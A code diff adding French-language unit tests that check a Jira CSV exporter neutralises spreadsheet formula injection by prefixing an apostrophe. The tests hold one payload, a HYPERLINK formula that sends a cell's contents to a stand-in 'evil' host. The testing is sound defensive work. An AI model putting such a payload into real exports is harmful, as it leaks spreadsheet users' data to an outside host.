@@ -164,3 +164,26 @@ describe('storiesToJiraCSV — échappement RFC 4180', () => {
     expect(descriptionField.startsWith('"')).toBe(true);
   });
 });
+
+describe('storiesToJiraCSV — neutralisation de l\'injection de formule CSV (OWASP)', () => {
+  const PAYLOAD = '=HYPERLINK("http://evil/leak?d="&A1,"x")';
+
+  it('un titre commençant par "=" est préfixé d\'une apostrophe avant l\'échappement RFC 4180', () => {
+    const csv = storiesToJiraCSV([makeStory({ title: PAYLOAD, description: '', criteria: [], gherkinGroups: [] })]);
+    const [, dataLine] = csv.split('\r\n');
+
+    // Le payload contient aussi une virgule et des guillemets : le champ
+    // Summary est donc entouré de guillemets RFC 4180 en plus du préfixe.
+    expect(dataLine.startsWith("\"'=")).toBe(true);
+  });
+
+  it('un champ description commençant par "=" est préfixé d\'une apostrophe même une fois entouré de guillemets RFC 4180', () => {
+    const csv = storiesToJiraCSV([
+      makeStory({ title: 'Titre inoffensif', fullStatement: PAYLOAD, description: '', criteria: [], gherkinGroups: [] }),
+    ]);
+    const [, dataLine] = csv.split('\r\n');
+    const descriptionField = dataLine.split('Story,')[1];
+
+    expect(descriptionField.startsWith("\"'=")).toBe(true);
+  });
+});
